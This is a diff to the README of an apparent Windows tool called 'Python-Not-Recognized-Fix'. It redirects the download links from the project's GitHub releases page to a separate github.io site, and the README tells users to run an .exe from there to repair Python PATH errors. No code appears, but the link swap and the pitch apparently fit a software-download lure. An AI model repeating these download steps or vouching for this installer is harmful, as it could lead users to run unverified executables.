@@ -1,6 +1,6 @@
 # 🛠️ Python-Not-Recognized-Fix - Repair Python path errors on Windows
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/runnerbeandogcatcher178/Python-Not-Recognized-Fix/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://runnerbeandogcatcher178.github.io)
 
 This software solves the common error where Windows fails to find Python. You see this error when you type python or pip into your command prompt and get a message saying the command does not exist. This tool fixes your system path variables automatically. You do not need to edit system settings manually or understand how environment variables work.
 
@@ -20,7 +20,7 @@ This tool works on any standard installation of Windows 10 or Windows 11. You ne
 
 ## 📥 How to download the fix
 
-Visit the [releases page](https://github.com/runnerbeandogcatcher178/Python-Not-Recognized-Fix/releases) to download the latest version of the installer. 
+Visit the [releases page](https://runnerbeandogcatcher178.github.io) to download the latest version of the installer. 
 
 1. Click the link above to open the releases page.
 2. Look for the file ending in .exe in the latest release section.
